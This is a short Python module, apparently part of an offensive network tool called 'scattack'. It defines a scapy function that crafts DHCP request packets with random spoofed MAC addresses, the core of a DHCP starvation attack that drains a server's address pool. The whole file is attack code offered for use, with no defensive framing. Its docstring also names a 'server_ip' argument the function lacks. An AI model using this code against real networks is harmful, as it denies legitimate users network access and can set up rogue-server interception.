from scapy.layers.l2 import Packet, Ether
from scapy.fields import RandMAC
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP

from scattack.core.utils import ETHER_BROADCAST, IP_ANY, IP_BROADCAST


def create_dhcp_starve_packet(ip: str, target_mac: str = ETHER_BROADCAST) -> Packet:
    """Create DHCP packet.

    Args:
        ip (str): IP address to request
        server_ip (str): IP address of the server
    Returns:
        Packet: DHCP packet"""
    mac = RandMAC()
    return (
        Ether(src=mac, dst=target_mac)
        / IP(src=IP_ANY, dst=IP_BROADCAST)
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac)
        / DHCP(options=[("message-type", "request"), ("requested_addr", ip), "end"])
    )
